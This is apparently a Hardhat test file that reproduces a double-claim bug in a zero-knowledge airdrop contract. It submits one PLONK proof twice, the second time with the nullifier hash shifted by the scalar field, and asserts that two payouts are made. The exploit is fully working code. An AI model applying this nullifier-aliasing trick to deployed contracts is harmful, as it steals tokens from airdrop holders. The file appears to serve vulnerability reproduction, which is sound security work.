const fs = require("fs");
const crypto = require("crypto");
const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const { abi: ERC20_ABI, bytecode: ERC20_BYTECODE } = require("@openzeppelin/contracts/build/contracts/ERC20PresetFixedSupply.json");
const { generateProofCallData, pedersenHash, toHex } = require("zkp-merkle-airdrop-lib");
const { readMerkleTreeAndSourceFromFile } = require("../utils/TestUtils");

const SCALAR_FIELD = ethers.BigNumber.from("21888242871839275222246405745257275088548364400416034343698204186575808495617");

describe("zkDrops vulnerable-parent nullifier alias", function () {
  it("accepts the same real PLONK proof twice and transfers two airdrops", async function () {
    const treeAndSource = readMerkleTreeAndSourceFromFile("./test/temp/mt_keys_8192.csv");
    const [owner, supplyHolder, redeemer] = await ethers.getSigners();
    const erc20 = await waffle.deployContract(owner, { bytecode: ERC20_BYTECODE, abi: ERC20_ABI }, [
      "Zk-airdrop", "ZkDRP", 100000, supplyHolder.address,
    ]);
    const verifier = await (await ethers.getContractFactory("PlonkVerifier", owner)).deploy();
    const airdrop = await (await ethers.getContractFactory("PrivateAirdrop", owner)).deploy(
      erc20.address, 10000, verifier.address, toHex(treeAndSource.merkleTree.root.val),
    );
    await erc20.connect(supplyHolder).transfer(airdrop.address, 80000);

    const leafIndex = 7;
    const nullifier = treeAndSource.leafNullifiers[leafIndex];
    const secret = treeAndSource.leafSecrets[leafIndex];
    const proof = await generateProofCallData(
      treeAndSource.merkleTree,
      nullifier,
      secret,
      redeemer.address,
      fs.readFileSync("./build/circuit_js/circuit.wasm"),
      fs.readFileSync("./build/circuit_final.zkey"),
    );
    const nullifierHash = ethers.BigNumber.from(toHex(pedersenHash(nullifier)));
    const alias = ethers.utils.hexZeroPad(nullifierHash.add(SCALAR_FIELD).toHexString(), 32);
    const canonical = ethers.utils.hexZeroPad(nullifierHash.toHexString(), 32);

    await (await airdrop.connect(redeemer).collectAirdrop(proof, canonical)).wait();
    await (await airdrop.connect(redeemer).collectAirdrop(proof, alias)).wait();

    expect(await erc20.balanceOf(redeemer.address)).to.equal(20000);
    expect(await erc20.balanceOf(airdrop.address)).to.equal(60000);
    expect(await airdrop.nullifierSpent(canonical)).to.equal(true);
    expect(await airdrop.nullifierSpent(alias)).to.equal(true);

    const observation = {
      vulnerableCommit: process.env.ZKDROPS_COMMIT,
      sameProofSha256: crypto.createHash("sha256").update(Buffer.from(proof.slice(2), "hex")).digest("hex"),
      canonicalNullifier: canonical,
      aliasedNullifier: alias,
      scalarField: SCALAR_FIELD.toString(),
      redeemerBalanceAfter: (await erc20.balanceOf(redeemer.address)).toString(),
      airdropBalanceAfter: (await erc20.balanceOf(airdrop.address)).toString(),
      stateEffects: 2,
    };
    fs.writeFileSync(process.env.ZKDROPS_OBSERVATION, JSON.stringify(observation, null, 2) + "\n");
    console.log(JSON.stringify(observation));
  });
});
